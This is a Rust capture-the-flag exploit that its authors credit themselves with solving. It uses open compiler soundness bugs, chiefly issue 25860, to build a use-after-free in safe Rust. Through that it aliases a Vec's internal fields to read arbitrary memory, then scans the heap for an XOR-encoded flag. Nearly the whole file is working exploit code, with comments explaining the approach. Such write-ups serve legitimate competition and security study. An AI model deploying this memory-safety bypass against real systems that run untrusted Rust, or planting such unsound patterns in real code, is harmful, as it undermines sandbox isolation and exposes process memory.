// rustc -C opt-level=0 exploit_rusty.rs
// rustup run 1.20.0 rustc -g -C opt-level=0 exploit_rusty.rs
// Solved by aweinstock and glenns

/*
We looked through https://github.com/rust-lang/rust/issues?page=2&q=is%3Aissue+is%3Aopen+label%3A"I-unsound+ðŸ’¥" to find open soundness bugs to exploit

We attempted to exploit https://github.com/rust-lang/rust/issues/10184 (which is weaponised as index out of bounds in the issue) and
    https://github.com/rust-lang/rust/issues/27282 (which is weaponisable as transmute by replacing Option with Result and using ::std::mem::replace instead of Option::take,
    but the above two bugs only worked in release mode; in debug mode, the index checks don't get optimised out by the float UB for 10184, and
    for 27282, the "redundant" enum tag check that re-checks variants that have already been checked in the same match (prior to being optimized out) ends up catching the soundness bug at runtime by falling through an implicit default case

Fortunately for us, https://github.com/rust-lang/rust/issues/25860 is weaponizable as a UAF in both debug and release mode, which allows us to read arbitrary memory via aliasing a Vec with a triple of usizes
*/

fn read_via_27282(addr: usize) -> u8 {
    let mut y = 4;
    let mut x : Result<&mut u8, *mut u8> = Ok(&mut y);
    match x {
        Err(_) => (),
        ref mut foo
            if {
                //(|| { let bar = foo; ::std::mem::replace(bar, Err(0xffffffffff600000usize as _)) })();
                (|| { let bar = foo; let _err = ::std::mem::replace(bar, Err(addr as _)); })();
                false
            } => (),
        /*ref mut foo
            if {
                match foo {
                    &mut Ok(ref x) => println!("1 {:?}", x),
                    &mut Err(ref x) => println!("2 {:?}", x),
                };
                false
            } => (),*/
        Ok(ref s) => {
            //println!("inside {}", s);
            return **s;
        },
    }
    panic!("this is unreachable in release mode, but in debug mode, this gets hit");
}

// {UNIT, foo, bad} are taken from issue 25860, and exploit the typesystem to cause unsoundness
static UNIT: &'static &'static () = &&();

fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T { v }

fn bad<'a, T>(x: &'a T) -> &'static T {
    let f: fn(_, &'a T) -> &'static T = foo;
    f(UNIT, x)
}

fn endianswap(x: u32) -> u32 {
    (x & 0xff000000) >> 24 |
    (x & 0x00ff0000) >> 08 |
    (x & 0x0000ff00) << 08 |
    (x & 0x000000ff) << 24
}

pub fn code() {
    println!("reached 1");

    // the "bad" function from issue 25860 allows one to write a UAF
    fn inner() -> &'static Vec<u8> {
        let x = Box::new(Vec::new());
        bad(&*x)
    }

    let x = inner();
    // which allows us to alias a tuple of three integers with the vec's (pointer, capacity, length) fields
    // which allows us to read at arbitrary addresses arbitrarily many times
    let mut y = Box::new((1usize, 2usize, 3usize));
    println!("x: {:?} {} {}", x.as_ptr(), x.capacity(), x.len());

    let mut r = |addr: usize| { y.0 = addr; x[0] };
    //let mut r = |addr: usize| { read_via_27282(addr) }; // s/opt-level=0/opt-level=2/ to see this work
    let r32 = |r: &mut FnMut(usize) -> u8, x: usize| {
        let mut tmp = 0u32;
        for j in 0..4 {
            tmp |= (r(x+3-j) as u32) << (8 * j);
        }
        tmp
    };

    let dump = |r: &mut FnMut(usize) -> u8, start: usize, len: usize| {
        let mut out = Vec::with_capacity(len);
        for i in 0..len {
            out.push(r(start+i));
        }
        out
    };

    let mut i: usize = &main as *const _ as _;
    while { let tmp = r32(&mut r, i); tmp != 0x7f454c46 || i != i & !3} { i -= 1; }
    println!("start of ELF header {:x}", i);
    //println!("plt? getenv? {:?}", dump(&mut r, i+0x00007030, 0x1000));
    let somewhere_on_the_heap: usize = Box::into_raw(Box::new(0x4242424242424242usize)) as _;

    // the binary reads the flag into a vec of (random32, random32 ^ flag8), so search memory for consecutive u32's that xor to printable ascii
    static AMOUNT: usize = 0x18000; // approximate heap size found via trial and error
    let mut output = Vec::new();
    for i in 0..AMOUNT {
        let a = r32(&mut r, somewhere_on_the_heap - AMOUNT + i*4);
        let b = r32(&mut r, somewhere_on_the_heap - AMOUNT + i*4 + 4);
        let c = endianswap(a ^ b);
        if c & 0xffffff00 == 0 && c >= 0x20 && c <= 0x80 {
            output.push(c as u8);
        }
    }

    println!("{:?}", output);
    println!("{}", String::from_utf8_lossy(&output[..]));
    
    println!("reached 2");
}

fn main() {
    assert_eq!(endianswap(0x11223344), 0x44332211);
    code();
}
